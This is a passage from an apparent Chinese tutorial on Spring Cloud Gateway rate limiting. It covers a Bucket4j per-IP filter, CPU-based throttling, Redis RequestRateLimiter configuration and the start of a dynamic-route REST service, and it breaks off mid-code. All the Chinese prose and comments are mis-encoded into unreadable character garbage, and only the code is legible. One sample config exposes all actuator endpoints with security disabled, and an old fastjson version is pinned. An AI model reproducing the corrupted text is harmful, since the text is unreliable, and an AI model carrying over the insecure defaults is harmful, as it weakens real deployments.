¸å¿ƒæµç¨‹æ—¶ï¼Œéœ€è¦æš‚æ—¶å°†å…¶å±è”½æ‰ï¼Œå¾…é«˜å³°è¿‡å»ä¹‹åæˆ–è€…é—®é¢˜è§£å†³åå†æ‰“å¼€ï¼›è€Œæœ‰äº›åœºæ™¯å¹¶ä¸èƒ½ç”¨ç¼“å­˜å’Œé™çº§æ¥è§£å†³ï¼Œæ¯”å¦‚ç¨€ç¼ºèµ„æºï¼ˆç§’æ€ã€æŠ¢è´­ï¼‰ã€å†™æœåŠ¡ï¼ˆå¦‚è¯„è®ºã€ä¸‹å•ï¼‰ã€é¢‘ç¹çš„å¤æ‚æŸ¥è¯¢ç­‰ï¼Œå› æ­¤éœ€è¦æœ‰ä¸€ç§æ‰‹æ®µæ¥é™åˆ¶è¿™äº›åœºæ™¯çš„å¹¶å‘ / è¯·æ±‚é‡ï¼Œå³é™æµã€‚é™æµçš„ç›®çš„æ˜¯é€šè¿‡å¯¹å¹¶å‘è®¿é—® / è¯·æ±‚è¿›è¡Œé™é€Ÿæˆ–è€…å¯¹ä¸€ä¸ªæ—¶é—´çª—å£å†…çš„è¯·æ±‚è¿›è¡Œé™é€Ÿæ¥ä¿æŠ¤ç³»ç»Ÿï¼Œä¸€æ—¦è¾¾åˆ°é™åˆ¶é€Ÿç‡åˆ™å¯ä»¥æ‹’ç»æœåŠ¡ï¼ˆå®šå‘åˆ°é”™è¯¯é¡µæˆ–å‹å¥½çš„å±•ç¤ºé¡µï¼‰ã€æ’é˜Ÿæˆ–ç­‰å¾…ï¼ˆæ¯”å¦‚ç§’æ€ã€è¯„è®ºã€ä¸‹å•ç­‰åœºæ™¯ï¼‰ã€é™çº§ï¼ˆè¿”å›å…œåº•æ•°æ®æˆ–é»˜è®¤æ•°æ®ï¼‰ã€‚ä¸»æµçš„ä¸­é—´ä»¶éƒ½ä¼šæœ‰å•æœºé™æµæ¡†æ¶ï¼Œä¸€èˆ¬æ”¯æŒä¸¤ç§é™æµæ¨¡å¼ï¼šæ§åˆ¶é€Ÿç‡å’Œæ§åˆ¶å¹¶å‘ã€‚Spring Cloud Zuul é€šè¿‡ç¬¬ä¸‰æ–¹æ‰©å±• spring-cloud-zuul-ratelimit ä¹Ÿå¯ä»¥æ”¯æŒé™æµã€‚Spring Cloud Gateway æ˜¯ä¸€ä¸ª API ç½‘å…³ä¸­é—´ä»¶ï¼Œç½‘å…³æ˜¯æ‰€æœ‰è¯·æ±‚æµé‡çš„å…¥å£ï¼›ç‰¹åˆ«æ˜¯åƒå¤©çŒ«åŒåä¸€ã€åŒåäºŒç­‰é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œå½“æµé‡è¿…é€Ÿå‰§å¢ï¼Œç½‘å…³é™¤äº†è¦ä¿æŠ¤è‡ªèº«ä¹‹å¤–ï¼Œè¿˜è¦é™æµä¿æŠ¤åç«¯åº”ç”¨ã€‚å¸¸è§çš„é™æµç®—æ³•æœ‰æ¼æ¡¶å’Œä»¤ç‰Œæ¡¶ï¼Œè®¡æ•°å™¨ä¹Ÿå¯ä»¥è¿›è¡Œç²—æš´é™æµå®ç°ã€‚å¯¹äºé™æµç®—æ³•ï¼Œå¯ä»¥å‚è€ƒ Guava ä¸­çš„ RateLimiterã€Bucket4jã€RateLimitJ ç­‰é¡¹ç›®çš„å…·ä½“å®ç°ã€‚ä¸‹é¢å°†ä»‹ç»å¦‚ä½•åŸºäº Bucket4jã€RequestRateLimiterGatewayFilterFactory å®ç°é™æµï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ åŸºäº Bucket4j å®ç°é™æµåœ¨ Spring Cloud Gateway ä¸­å®ç°é™æµæ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦ç¼–å†™ä¸€ä¸ªè¿‡æ»¤å™¨å°±å¯ä»¥ã€‚ä¸‹é¢ä»‹ç»åœ¨ Spring Cloud Gateway ä¸­ä½¿ç”¨ Bucket4j å®ç°é™æµï¼Œç”±äºç¯‡å¹…æœ‰é™ï¼Œåªç»™å‡º Gateway Server å·¥ç¨‹çš„æ ¸å¿ƒä»£ç å’Œé…ç½®ã€‚ æ·»åŠ  Maven ä¾èµ– 123456789&lt;dependency&gt; &lt;groupId&gt;com.github.vladimir-bukhtoyarov&lt;/groupId&gt; &lt;artifactId&gt;bucket4j-core&lt;/artifactId&gt; &lt;version&gt;4.10.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt; ç¼–å†™è‡ªå®šä¹‰è¿‡æ»¤å™¨å¯¹ç‰¹å®šèµ„æºè¿›è¡Œé™æµ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/** * é’ˆå¯¹å®¢æˆ·ç«¯IPè¿›è¡Œé™æµ */public class GatewayRateLimitFilterByIp implements GatewayFilter, Ordered { private final Logger log = LoggerFactory.getLogger(GatewayRateLimitFilterByIp.class); /** * å•æœºç½‘å…³é™æµç”¨ä¸€ä¸ªConcurrentHashMapæ¥å­˜å‚¨ bucketï¼Œ * å¦‚æœæ˜¯åˆ†å¸ƒå¼é›†ç¾¤é™æµçš„è¯ï¼Œå¯ä»¥é‡‡ç”¨ Redisç­‰åˆ†å¸ƒå¼è§£å†³æ–¹æ¡ˆ */ private static final Map&lt;String, Bucket&gt; LOCAL_CACHE = new ConcurrentHashMap&lt;&gt;(); /** * ä»¤ç‰Œæ¡¶çš„æœ€å¤§å®¹é‡ï¼Œå³èƒ½è£…è½½ä»¤ç‰Œçš„æœ€å¤§æ•°é‡ */ int capacity; /** * æ¯æ¬¡è¡¥å……ä»¤ç‰Œçš„æ•°é‡ */ int refillTokens; /** * è¡¥å……ä»¤ç‰Œçš„æ—¶é—´é—´éš” */ Duration refillDuration; public GatewayRateLimitFilterByIp() { } public GatewayRateLimitFilterByIp(int capacity, int refillTokens, Duration refillDuration) { this.capacity = capacity; this.refillTokens = refillTokens; this.refillDuration = refillDuration; } private Bucket createNewBucket() { Refill refill = Refill.greedy(refillTokens, refillDuration); Bandwidth limit = Bandwidth.classic(capacity, refill); return Bucket4j.builder().addLimit(limit).build(); } @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { String ip = exchange.getRequest().getRemoteAddress().getAddress().getHostAddress(); Bucket bucket = LOCAL_CACHE.computeIfAbsent(ip, k -&gt; createNewBucket()); log.info("IP:{} ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:{} ", ip, bucket.getAvailableTokens()); if (bucket.tryConsume(1)) { return chain.filter(exchange); } else { //å½“å¯ç”¨çš„ä»¤ç‰Œæ•°ä¸º0æ—¶ï¼Œè¿›è¡Œé™æµï¼Œè¿”å›429çŠ¶æ€ç  exchange.getResponse().setStatusCode(HttpStatus.TOO_MANY_REQUESTS); return exchange.getResponse().setComplete(); } } @Override public int getOrder() { return -1000; } // çœç•¥Getå’ŒSetæ–¹æ³• ...} é€šè¿‡ Java æµå¼ API çš„æ–¹å¼é…ç½®è·¯ç”±è§„åˆ™ï¼Œå…¶ä¸­ http://127.0.0.1:9091/sayHello/peter/ å¯¹åº”çš„æ˜¯åç«¯çš„æœåŠ¡ï¼Œè¿™é‡Œä¸å†ç´¯è¿° 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator rateLimitFilterByIp(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path("/rateLimit") .filters(f -&gt; f.filter(new GatewayRateLimitFilterByIp(10, 1, Duration.ofSeconds(1)))) .uri("http://127.0.0.1:9091/sayHello/peter/") .id("ratelimit_route")) .build(); }} ç¼–å†™ application.yml é…ç½®æ–‡ä»¶ 123456server: port: 9090spring: application: name: gateway-server æµ‹è¯•ç»“æœ å¯åŠ¨å„ä¸ªåº”ç”¨åï¼Œå¤šæ¬¡è®¿é—® http://127.0.0.1:9090/rateLimitï¼Œå¯ä»¥çœ‹åˆ°æ§åˆ¶å°è¾“å‡ºå¦‚ä¸‹æ—¥å¿—ä¿¡æ¯ã€‚å½“å¯ç”¨çš„ä»¤ç‰Œæ•°é‡ä¸º 0 æ—¶ï¼ŒSpring Cloud Gateway ä¸­è‡ªå®šä¹‰çš„é™æµè¿‡æ»¤å™¨å¼€å§‹æ‹’ç»å¤„ç†è¯·æ±‚ï¼Œç›´æ¥è¿”å› 429 çŠ¶æ€ç ï¼ˆå› ä¸ºè¯·æ±‚å¤ªå¤šï¼Œé™æµè¿”å› 429 çŠ¶æ€ç ï¼‰ã€‚ 1234567891011121314c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:10c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:9c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:8c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:7c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:7c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:6c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:5c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:4c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:3c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:2c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:2c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:1c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:0c.s.s.filter.GatewayRateLimitFilterByIp : IP:127.0.0.1 ,ä»¤ç‰Œæ¡¶å¯ç”¨çš„ä»¤ç‰Œæ•°é‡:0 åŸºäº CPU çš„ä½¿ç”¨ç‡è¿›è¡Œé™æµåœ¨å®é™…é¡¹ç›®åº”ç”¨ä¸­å¯¹ç½‘å…³è¿›è¡Œé™æµæ—¶ï¼Œéœ€è¦å‚è€ƒçš„å› ç´ æ¯”è¾ƒå¤šï¼Œå¯èƒ½ä¼šæ ¹æ®ç½‘ç»œè¯·æ±‚è¿æ¥æ•°ã€è¯·æ±‚æµé‡ã€CPU ä½¿ç”¨ç‡ã€å†…å­˜ä½¿ç”¨ç‡ç­‰è¿›è¡Œæµæ§ã€‚å¯ä»¥é€šè¿‡ Spring Boot Actuator æä¾›çš„ Metrics è·å–å½“å‰ CPU çš„ä½¿ç”¨æƒ…å†µï¼Œå½“ CPU ä½¿ç”¨ç‡é«˜äºæŸä¸ªé˜ˆå€¼å°±å¼€å¯é™æµï¼Œå¦åˆ™ä¸å¼€å¯é™æµã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ Actuator 1.x é‡Œå¯ä»¥é€šè¿‡ SystemPublicMetrics æ¥è·å– CPU çš„ä½¿ç”¨æƒ…å†µï¼Œä½†æ˜¯åœ¨ Actuator 2.x é‡Œåªèƒ½é€šè¿‡ MetricsEndpoint æ¥è·å–ã€‚ç”±äºç¯‡å¹…æœ‰é™ï¼Œä¸‹é¢åªç»™å‡º Gateway Server å·¥ç¨‹çš„æ ¸å¿ƒä»£ç å’Œé…ç½®ã€‚ æ·»åŠ  Maven ä¾èµ– 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; ç¼–å†™è‡ªå®šä¹‰è¿‡æ»¤å™¨å¯¹ç‰¹å®šèµ„æºè¿›è¡Œé™æµ 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * æ ¹æ®CPUçš„ä½¿ç”¨ç‡é™æµ **/@Componentpublic class GatewayRateLimitFilterByCpu implements GatewayFilter, Ordered { @Autowired private MetricsEndpoint metricsEndpoint; private static final double MAX_USAGE = 0.50D; private static final String METRIC_NAME = "system.cpu.usage"; private final Logger log = LoggerFactory.getLogger(GatewayRateLimitFilterByCpu.class); @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { //è·å–ç½‘å…³æœåŠ¡æ‰€åœ¨æœºå™¨çš„CPUä½¿ç”¨æƒ…å†µ Double systemCpuUsage = metricsEndpoint.metric(METRIC_NAME, null) .getMeasurements() .stream() .filter(Objects::nonNull) .findFirst() .map(MetricsEndpoint.Sample::getValue) .filter(Double::isFinite) .orElse(0.0D); boolean isOpenRateLimit = systemCpuUsage &gt; MAX_USAGE; log.info("system.cpu.usage: {}, isOpenRateLimit:{} ", systemCpuUsage, isOpenRateLimit); if (isOpenRateLimit) { //å½“CPUçš„ä½¿ç”¨è¶…è¿‡è®¾ç½®çš„æœ€å¤§é˜€å€¼æ—¶ï¼Œåˆ™å¼€å¯é™æµ exchange.getResponse().setStatusCode(HttpStatus.TOO_MANY_REQUESTS); return exchange.getResponse().setComplete(); } else { return chain.filter(exchange); } } @Override public int getOrder() { return 0; }} é€šè¿‡ Java æµå¼ API çš„æ–¹å¼é…ç½®è·¯ç”±è§„åˆ™ï¼Œå…¶ä¸­ http://127.0.0.1:9091/sayHello/peter/ å¯¹åº”çš„æ˜¯åç«¯çš„æœåŠ¡ï¼Œè¿™é‡Œä¸å†ç´¯è¿° 12345678910111213141516@Configurationpublic class CommonConfiguration { @Autowired private GatewayRateLimitFilterByCpu gatewayRateLimitFilterByCpu; @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path("/rateLimit") .filters(f -&gt; f.filter(gatewayRateLimitFilterByCpu)) .uri("http://127.0.0.1:9091/sayHello/peter/") .id("rateLimit_route") ).build(); }} ç¼–å†™ application.yml é…ç½®æ–‡ä»¶ 1234567891011121314server: port: 9093spring: application: name: gateway-servermanagement: endpoints: web: exposure: include: \'*\' security: enabled: false æµ‹è¯•ç»“æœ i. Linux ç³»ç»Ÿä¸‹æ‰§è¡Œå‹æµ‹å‘½ä»¤ sysbench cpu --cpu-max-prime=20000 --threads=8 --time=60 run æ¥æ¨¡æ‹Ÿ CPU é«˜è´Ÿè½½ï¼Œå…¶ä¸­ --threads æ˜¯æŒ‡ CPU æ ¸æ•°ï¼Œ--time æ˜¯æŒ‡è¿è¡Œæ—¶é—´ï¼ˆç§’ï¼‰ii. è®¿é—® http://localhost:9093/actuator/metrics/system.cpu.usageï¼ŒæŸ¥çœ‹ç½‘å…³æœåŠ¡æ‰€åœ¨æœºå™¨çš„ CPU ä½¿ç”¨æƒ…å†µiii. å¯åŠ¨å„ä¸ªåº”ç”¨åï¼Œå¤šæ¬¡è®¿é—® http://127.0.0.1:9090/rateLimitï¼Œå½“ CPU ä½¿ç”¨ç‡è¶…è¿‡ 50% åï¼ŒSpring Cloud Gateway ä¸­è‡ªå®šä¹‰çš„é™æµè¿‡æ»¤å™¨å¼€å§‹æ‹’ç»å¤„ç†è¯·æ±‚ï¼Œç›´æ¥è¿”å› 429 çŠ¶æ€ç ï¼ˆå› ä¸ºè¯·æ±‚å¤ªå¤šï¼Œé™æµè¿”å› 429 çŠ¶æ€ç ï¼‰ï¼Œæ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 12345c.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.846045400926432, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.8458261370178468, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.844951044863364, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.8547458051590282, isOpenRateLimit:truec.s.s.f.GatewayRateLimitFilterByCpu : system.cpu.usage: 0.8486913849509269, isOpenRateLimit:true Gateway å†…ç½®çš„é™æµè¿‡æ»¤å™¨å·¥å‚Spring Cloud Gateway å†…ç½®äº†ä¸€ä¸ªåä¸º RequestRateLimiterGatewayFilterFactory çš„è¿‡æ»¤å™¨å·¥å‚ï¼Œå¯ä»¥ç›´æ¥ç”¨æ¥é™æµï¼›å…¶åº•å±‚çš„å®ç°ä¾èµ–äº Redisï¼Œä½¿ç”¨çš„ç®—æ³•æ˜¯ä»¤ç‰Œæ¡¶ç®—æ³•ã€‚ç”±äºç¯‡å¹…æœ‰é™ï¼Œä¸‹é¢åªç»™å‡º Gateway Server å·¥ç¨‹çš„æ ¸å¿ƒä»£ç å’Œé…ç½®ã€‚ æ·»åŠ  Maven ä¾èµ– 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis-reactive&lt;/artifactId&gt;&lt;/dependency&gt; ç¼–å†™ RemoteAddrKeyResolver ç±» 123456789public class RemoteAddrKeyResolver implements KeyResolver { public static final String BEAN_NAME = "remoteAddrKeyResolver"; @Override public Mono&lt;String&gt; resolve(ServerWebExchange exchange) { return Mono.just(exchange.getRequest().getRemoteAddress().getAddress().getHostAddress()); }} ç¼–å†™ CommonConfiguration ç±» 12345678@Configurationpublic class CommonConfiguration { @Bean(RemoteAddrKeyResolver.BEAN_NAME) public RemoteAddrKeyResolver remoteAddrKeyResolver() { return new RemoteAddrKeyResolver(); }} ç¼–å†™ application.yml é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ  Gateway é™æµç›¸å…³çš„é…ç½®å†…å®¹ 123456789101112131415161718192021222324252627server: port: 9092spring: application: name: gateway-server redis: host: 172.175.0.3 port: 6379 cloud: gateway: routes: - id: rateLimit_route uri: http://127.0.0.1:9091/sayHello/peter/ order: 0 predicates: - Path=/rateLimit filters: #Filteråç§°å¿…é¡»æ˜¯RequestRateLimiter - name: RequestRateLimiter args: #ä½¿ç”¨SpELæŒ‰åç§°å¼•ç”¨bean key-resolver: "#{@remoteAddrKeyResolver}" #å…è®¸ç”¨æˆ·æ¯ç§’å¤„ç†å¤šå°‘ä¸ªè¯·æ±‚ redis-rate-limiter.replenishRate: 1 #ä»¤ç‰Œæ¡¶çš„å®¹é‡ï¼Œå…è®¸åœ¨ä¸€ç§’é’Ÿå†…å®Œæˆçš„æœ€å¤§è¯·æ±‚æ•° redis-rate-limiter.burstCapacity: 5 æµ‹è¯•ç»“æœ å¯åŠ¨å„ä¸ªåº”ç”¨åï¼Œå¤šæ¬¡è®¿é—® http://127.0.0.1:9092/rateLimitï¼Œå¯ä»¥å‘ç°å½“è¯·æ±‚å¤ªè¿‡é¢‘ç¹çš„æ—¶å€™ï¼ŒSpring Cloud Gateway ä¼šç›´æ¥è¿”å› 429 çŠ¶æ€ç ã€‚ åŸºäº Sentinel å®ç°é™æµç†”æ–­é™çº§ Sentinel æ•´åˆ Gateway Spring Cloud Gateway çš„åŠ¨æ€è·¯ç”±ç½‘å…³ä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„æ¦‚å¿µï¼Œé‚£å°±æ˜¯è·¯ç”±é…ç½®å’Œè·¯ç”±è§„åˆ™ã€‚è·¯ç”±é…ç½®æ˜¯æŒ‡é…ç½®æŸè¯·æ±‚è·¯å¾„è·¯ç”±åˆ°æŒ‡å®šçš„ç›®çš„åœ°å€ï¼Œè€Œè·¯ç”±è§„åˆ™æ˜¯æŒ‡åŒ¹é…åˆ°è·¯ç”±é…ç½®ä¹‹åï¼Œå†æ ¹æ®è·¯ç”±è§„åˆ™è¿›è¡Œè½¬å‘å¤„ç†ã€‚ Spring Cloud Gateway ä½œä¸ºæ‰€æœ‰è¯·æ±‚æµé‡çš„å…¥å£ï¼Œåœ¨å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ä¸ºäº†ä¿è¯é«˜å¯é å’Œé«˜å¯ç”¨ï¼Œä»¥åŠå°½é‡é¿å…é‡å¯ï¼Œéœ€è¦å®ç° Spring Cloud Gateway åŠ¨æ€è·¯ç”±é…ç½®ã€‚Spring Cloud Gateway æä¾›äº†ä¸¤ç§æ–¹æ³•æ¥é…ç½®è·¯ç”±è§„åˆ™ï¼ˆJava æµå¼ APIã€YML é…ç½®æ–‡ä»¶ï¼‰ï¼Œä½†éƒ½æ˜¯åœ¨ Spring Cloud Gateway å¯åŠ¨æ—¶å°†è·¯ç”±é…ç½®å’Œè§„åˆ™åŠ è½½åˆ°å†…å­˜é‡Œï¼Œæ— æ³•åšåˆ°ä¸é‡å¯ç½‘å…³åº”ç”¨å°±å¯ä»¥åŠ¨æ€åœ°å¯¹è·¯ç”±çš„é…ç½®å’Œè§„åˆ™è¿›è¡Œå¢åŠ ã€ä¿®æ”¹å’Œåˆ é™¤æ“ä½œã€‚Spring Cloud Gateway çš„å®˜æ–¹æ–‡æ¡£å¹¶æ²¡æœ‰è®²å¦‚ä½•è¿›è¡ŒåŠ¨æ€é…ç½®ï¼ŒæŸ»çœ‹ Spring Cloud Gateway çš„æºç ï¼Œå‘ç°åœ¨ org.springframework.cloud.gateway.actuate.GatewayControllerEndpoint ç±»ä¸­æä¾›äº†åŠ¨æ€é…ç½®çš„ Rest æ¥å£ï¼Œä½†æ˜¯éœ€è¦å¼€å¯ Gateway çš„ç«¯ç‚¹ï¼Œè€Œä¸”å…¶æä¾›çš„åŠŸèƒ½ä¸æ˜¯å¾ˆå¼ºå¤§ã€‚é€šè¿‡å‚è€ƒä¸ GatewayControllerEndpoint ç›¸å…³çš„ä»£ç ï¼Œå¯ä»¥è‡ªå·±ç¼–ç å®ç°åŠ¨æ€è·¯ç”±é…ç½®ã€‚ åŸºäº Rest API çš„åŠ¨æ€è·¯ç”±å®ç°ï¼ˆå†…å­˜ç‰ˆï¼‰ä¸‹é¢å°†ä»‹ç» Gateway åŸºäº Rest API çš„åŠ¨æ€è·¯ç”±å®ç°ï¼Œä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œä¸‹è¿°ç¤ºä¾‹çš„è·¯ç”±é…ç½®ä¿¡æ¯é»˜è®¤å­˜å‚¨åœ¨å†…å­˜ï¼›è‹¥éœ€è¦æŒä¹…åŒ–è·¯ç”±é…ç½®ä¿¡æ¯ï¼ˆå¦‚ MySQL æŒä¹…åŒ–ï¼‰ï¼Œå¯ä»¥æ‰©å±•å®ç° RouteDefinitionRepository æ¥å£ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ æ·»åŠ  Maven ä¾èµ– 1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.47&lt;/version&gt;&lt;/dependency&gt; å®šä¹‰æ•°æ®ä¼ è¾“æ¨¡å‹ï¼Œåˆ†åˆ«ç¼–å†™ GatewayRouteDefinitionã€GatewayPredicateDefinitionã€GatewayFilterDefinition ç±» 1234567891011121314151617181920212223242526272829303132/** * Gatewayçš„è·¯ç”±å®šä¹‰æ¨¡å‹ */public class GatewayRouteDefinition { /** * è·¯ç”±çš„Id */ private String id; /** * è·¯ç”±æ–­è¨€é›†åˆé…ç½® */ private List&lt;GatewayPredicateDefinition&gt; predicates = new ArrayList&lt;&gt;(); /** * è·¯ç”±è¿‡æ»¤å™¨é›†åˆé…ç½® */ private List&lt;GatewayFilterDefinition&gt; filters = new ArrayList&lt;&gt;(); /** * è·¯ç”±è§„åˆ™è½¬å‘çš„ç›®æ ‡uri */ private String uri; /** * è·¯ç”±æ‰§è¡Œçš„é¡ºåº */ private int order = 0; // çœç•¥Getå’ŒSetæ–¹æ³• ...} 1234567891011121314151617/** * è·¯ç”±æ–­è¨€å®šä¹‰æ¨¡å‹ */public class GatewayPredicateDefinition { /** * æ–­è¨€å¯¹åº”çš„Name */ private String name; /** * é…ç½®çš„æ–­è¨€è§„åˆ™ */ private Map&lt;String, String&gt; args = new LinkedHashMap&lt;&gt;(); // çœç•¥Getå’ŒSetæ–¹æ³• ...} 1234567891011121314151617/** * è¿‡æ»¤å™¨å®šä¹‰æ¨¡å‹ */public class GatewayFilterDefinition { /** * Filter Name */ private String name; /** * å¯¹åº”çš„è·¯ç”±è§„åˆ™ */ private Map&lt;String, String&gt; args = new LinkedHashMap&lt;&gt;(); // çœç•¥Getå’ŒSetæ–¹æ³• ...} ç¼–å†™åŠ¨æ€è·¯ç”±çš„å®ç°ç±» DynamicRouteServicelmplï¼Œéœ€è¦å®ç° ApplicationEventPublisherAware æ¥å£ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * åŠ¨æ€è·¯ç”±å®ç°ç±» */@Servicepublic class DynamicRouteServiceImpl implements ApplicationEventPublisherAware { private ApplicationEventPublisher publisher; @Autowired private RouteDefinitionWriter routeDefinitionWriter; private static final Logger logger = LoggerFactory.getLogger(DynamicRouteServiceImpl.class); @Override public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) { this.publisher = applicationEventPublisher; } private void notifyChanged() { this.publisher.publishEvent(new RefreshRoutesEvent(this)); } /** * å¢åŠ è·¯ç”± * * @param definition * @return */ public boolean add(RouteDefinition definition) { try { routeDefinitionWriter.save(Mono.just(definition)).subscribe(); notifyChanged(); } catch (Exception e) { logger.error("add route fail: " + e.getMessage()); return false; } return true; } /** * æ›´æ–°è·¯ç”± * * @param definition * @return */ public boolean update(RouteDefinition definition) { try { // ç‰¹åˆ«æ³¨æ„ï¼Œè¿™é‡Œä¸€å®šä¸èƒ½æ‰§è¡Œsubscribe()æ–¹æ³•ï¼Œå¦åˆ™æ›´æ–°é€»è¾‘å­˜åœ¨Bug this.routeDefinitionWriter.delete(Mono.just(definition.getId())); } catch (Exception e) { logger.error("update route fail: " + e.getMessage()); return false; } try { routeDefinitionWriter.save(Mono.just(definition)).subscribe(); notifyChanged(); return true; } catch (Exception e) { logger.error("update route fail: " + e.getMessage()); return false; } } /** * åˆ é™¤è·¯ç”± * * @param id * @return */ public boolean delete(String id) { try { this.routeDefinitionWriter.delete(Mono.just(id)).subscribe(); notifyChanged(); return true; } catch (Exception e) { logger.error("delete route fail: " + e.getMessage()); return false; } } /** * è£…é…è·¯ç”±é…ç½®ä¿¡æ¯ * * @param gwdefinition * @return */ public RouteDefinition assembleRouteDefinition(GatewayRouteDefinition gwdefinition) { RouteDefinition definition = new RouteDefinition(); // ID definition.setId(gwdefinition.getId()); // Predicates List&lt;PredicateDefinition&gt; pdList = new ArrayList&lt;&gt;(); for (GatewayPredicateDefinition gpDefinition : gwdefinition.getPredicates()) { PredicateDefinition predicate = new PredicateDefinition(); predicate.setArgs(gpDefinition.getArgs()); predicate.setName(gpDefinition.getName()); pdList.add(predicate); } definition.setPredicates(pdList); // Filters List&lt;FilterDefinition&gt; fdList = new ArrayList&lt;&gt;(); for (GatewayFilterDefinition gfDefinition : gwdefinition.getFilters()) { FilterDefinition filter = new FilterDefinition(); filter.setArgs(gfDefinition.getArgs()); filter.setName(gfDefinition.getName()); fdList.add(filter); } definition.setFilters(fdList); // URI URI uri = UriComponentsBuilder.fromUriString(gwdefinition.getUri()).build().toUri(); definition.setUri(uri); return definition; }} ç¼–å†™ Rest æ§åˆ¶å™¨ï¼Œå¯¹å¤–æš´éœ² Rest API 123456789101112131415161718192021222324252627282930313233343536373839404142@RestController@RequestMapping("/route")public class RouteController { @Autowired private DynamicRouteServiceImpl dynamicRouteService; /** * å¢åŠ è·¯ç”± * * @param gwdefinition * @return */ @PostMapping("/add") public String add(@RequestBody 